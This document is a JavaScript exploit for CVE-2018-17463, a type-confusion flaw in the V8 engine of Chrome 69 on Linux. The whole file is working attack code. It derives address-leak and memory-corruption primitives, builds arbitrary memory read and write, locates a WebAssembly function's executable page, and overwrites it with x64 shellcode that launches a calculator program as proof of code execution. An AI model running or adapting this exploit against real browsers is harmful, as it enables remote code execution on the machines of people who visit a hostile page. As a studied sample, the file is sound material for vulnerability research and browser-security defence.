/*
  CVE-2018-17463 exp
  Chrome 69.0.3497.81 on Linux x64
  V8 version 6.9.427.19
*/

var is_debug = false;

function breakpoint() {
  if (is_debug) {
    // b builtins-math.cc:20
    Math.hypot(3, 4);
  }
}

function log(msg) {
  console.log(msg);
}

function dlog(msg) {
  if (is_debug) {
    console.log(msg);
  }
}

function v8_dprint(msg) {
  if (is_debug) {
//    %DebugPrint(msg);
  }
}

function gc() {
  for (var i = 0; i < 0x10; i++) {
    new ArrayBuffer(0x1000000);
  }
}

let floatView = new Float64Array(1);
let uint64View = new BigUint64Array(floatView.buffer);
let uint8View = new Uint8Array(floatView.buffer);

Number.prototype.toBigInt = function toBigInt() {
  floatView[0] = this;
  return uint64View[0];
}

BigInt.prototype.toNumber = function toNumber() {
  uint64View[0] = this;
  return floatView[0];
}

function f(o) {
  o.inline;
  Object.create(o);
  return o.outline;
}


const MAX_ITERATION = 10000;
const NUM_PROPERTIES = 32;

function makeObj(propertyValues) {
  let o = { inline: 0x1337 };
  for (let i = 0; i < NUM_PROPERTIES; i++) {
    Object.defineProperty(o, 'p' + i, {
      writable: true,
      value: propertyValues[i]
    });
  }
  return o;
}

let p1, p2;
function findOverlappingProperties() {
  let propertyNames = [];
  for (let i = 0; i < NUM_PROPERTIES; i++) {
    propertyNames[i] = 'p' + i;
  }
  eval(`
    function hax(o) {
      o.inline;
      this.Object.create(o);
      ${propertyNames.map((p) => `let ${p} = o.${p};`).join('\n')}
      return [${propertyNames.join(', ')}];
    }
  `);
  let propertyValues = [];
  for (let i = 1; i < NUM_PROPERTIES; i++) {
    propertyValues[i] = -i;
  }
  for (let i = 0; i < MAX_ITERATION; i++) {
    let r = hax(makeObj(propertyValues));
    for (let i = 1; i < r.length; i++) {
      if (i !== -r[i] && r[i] < 0 && r[i] > -NUM_PROPERTIES) {
        [p1, p2] = [i, -r[i]];
        return;
      }
    }
  }
  throw 'Failed to find overlapping properties';
}

function addrof(obj) {
  eval(`
    function hax(o) {
      o.inline;
      this.Object.create(o);
      return o.p${p1}.x1;
    }
  `);
  let propertyValues = [];
  propertyValues[p1] = { x1: 13.37, x2: 13.28 };
  propertyValues[p2] = { y: obj };
  for (let i = 0; i < MAX_ITERATION; i++) {
    let res = hax(makeObj(propertyValues));
    if (res !== 13.37) {
      return res.toBigInt() - 1n;
    }
  }
  throw 'Addrof failed';
}

function corrupt(victim, newValue) {
  eval(`
    function hax(o) {
      o.inline;
      this.Object.create(o);
      let orig = o.p${p1}.x2;
      o.p${p1}.x2 = ${newValue.toNumber()};
      return orig;
    }
  `);
  let propertyValues = [];
  let o = { x1: 13.37, x2: 13.28 };
  propertyValues[p1] = o;
  propertyValues[p2] = victim;

  for (let i = 0; i < MAX_ITERATION; i++) {
    o.x2 = 13.28;
    let r = hax(makeObj(propertyValues));
    if (r !== 13.28) {
      return r.toBigInt();
    }
  }
  throw 'Corrupt ArrayBuffer failed';
}

findOverlappingProperties();
log(`[+] Properties p${p1} and p${p2} overlap`);

let memViewBuf = new ArrayBuffer(1024);
let driverBuf = new ArrayBuffer(1024);

gc();

// v8_dprint(memViewBuf);
// v8_dprint(driverBuf);
// breakpoint();

let memViewBufAddr = addrof(memViewBuf);
log(`[+] ArrayBuffer at 0x${memViewBufAddr.toString(16)}`);

let origDriverBackingStore = corrupt(driverBuf, memViewBufAddr);
let driver = new BigUint64Array(driverBuf);
let origMemViewBackingStore = driver[4];

log(`[+] origDriverBackingStore: 0x${origDriverBackingStore.toString(16)}`);
log(`[+] origMemViewBackingStore: 0x${origMemViewBackingStore.toString(16)}`);
// breakpoint();

let memory = {
  write(addr, bytes) {
    driver[4] = addr;
    let memview = new Uint8Array(memViewBuf);
    memview.set(bytes);
  },
  read(addr, len) {
    driver[4] = addr;
    let memview = new Uint8Array(memViewBuf);
    return memview.subarray(0, len);
  },
  read64(addr) {
    driver[4] = addr;
    let memview = new BigUint64Array(memViewBuf);
    return memview[0];
  },
  write64(addr, ptr) {
    driver[4] = addr;
    let memview = new BigUint64Array(memViewBuf);
    memview[0] = ptr;
  }
  // addrof(obj) {
  //   memViewBuf.leakMe = obj;
  //   let props = this.read64(memViewBufAddr + 8n);
  //   return this.read64(props - 1n + 16n) - 1n;
  // },
  // fixup() {
  //   let driverBufAddr = this.addrof(driverBuf);
  //   this.write64(driverBufAddr + 32n, origDriverBackingStore);
  //   this.write64(memViewBufAddr + 32n, origMemViewBackingStore);
  // }
};

log('[+] Constructed memory read/write primitive');

function wasm_func() {
  var importObject = {
    imports: { imported_func: arg => console.log(arg) }
  };
  bc = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b];
  var wasm_code = new Uint8Array(bc);
  var wasm_mod = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), importObject);
  return wasm_mod.exports.exported_func;
}

let func = wasm_func();
let func_addr = addrof(func);
log(`[+] WASM func addr: 0x${func_addr.toString(16)}`);
// breakpoint();
let sfi = memory.read64(func_addr + 24n);
log(`[+] sfi: 0x${sfi.toString(16)}`);
let wasmExportedFunctionData = memory.read64(sfi + 8n - 1n);
log(`[+] WasmExporotedFunctionData: 0x${wasmExportedFunctionData.toString(16)}`);
let instance = memory.read64(wasmExportedFunctionData + 16n - 1n);
log(`[+] instance: 0x${instance.toString(16)}`);
// breakpoint();
let rwx = memory.read64(instance + 224n - 1n) + 18n;
log(`[+] rwx: 0x${rwx.toString(16)}`);

var shellcode = [].concat([
  0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48, 0xb8, 
  0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63, 0x00, 0x00, 0x50, 0x48, 
  0xb8, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 
  0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89, 
  0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a, 0x30, 0x00, 
  0x00, 0x50, 0x48, 0xb8, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 
  0x59, 0x3d, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 
  0x52, 0x48, 0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00, 
  0x00, 0x0f, 0x05]);

memory.write(rwx, shellcode);

breakpoint();

func();

// function vuln() {
//   function f(o) {
//     o.inline;
//     Object.create(o);
//     return o.p0;
//   }

//   for (let i = 0; i < 10000; i++) {
//     let o = { inline: 42 };
//     o.p0 = 0;
//     o.p1 = 1;
//     o.p2 = 2;
//     o.p3 = 3;
//     o.p4 = 4;
//     o.p5 = 5;
//     o.p6 = 6;
//     let r = f(o);
//     if (r.p6 !== 6) {
//       v8_dprint(o);
//       breakpoint();
//       return;
//     }
//   }
// }

// vuln();
